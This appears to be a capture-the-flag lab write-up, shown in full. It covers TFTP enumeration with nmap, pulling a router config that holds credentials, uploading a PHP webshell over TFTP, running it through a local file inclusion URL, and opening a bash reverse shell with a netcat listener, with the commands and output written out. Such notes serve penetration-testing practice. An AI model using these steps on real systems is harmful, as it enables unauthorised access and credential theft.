
```
nmap -sU 10.129.238.52 -p 69 --script=tftp-enum.nse
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 18:36 CDT
Nmap scan report for 10.129.238.52
Host is up (0.015s latency).

PORT   STATE SERVICE
69/udp open  tftp
| tftp-enum: 
|_  ciscortr.cfg

Nmap done: 1 IP address (1 host up) scanned in 103.45 seconds
```

By default tftp doesn't require authentication.

Connected to the tftp server and downloaded the ciscortr.cfg file.

```
tftp 10.129.238.52       
tftp> get ciscortr.cfg
tftp>
```

Viewed it on local machine and found credentials.

```
username ike password *****
```

---

As we can see from the UDP Scan, we were able to identify tftp open. Let's connect to it.

Uploaded webshell.

```
tftp 10.129.95.185
tftp> put wolfswebshell.php
```

Since we identified an LFI, we can view/execute the webshell when inspecting it in the browser.

```
http://10.129.95.185/?file=/var/lib/tftpboot/wolfswebshell.php
```

Started up listener on port 43.

```
nc -lvnp 43
```

Executed the following bash one-liner reverse shell script.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.44/43 0>&1'
```

Gained RCE as user "www-data".

```
nc -lvnp 43                           
listening on [any] 43 ...
connect to [10.10.14.44] from (UNKNOWN) [10.129.95.185] 41164
bash: cannot set terminal process group (1505): Inappropriate ioctl for device
bash: no job control in this shell
www-data@included:/var/www/html$
```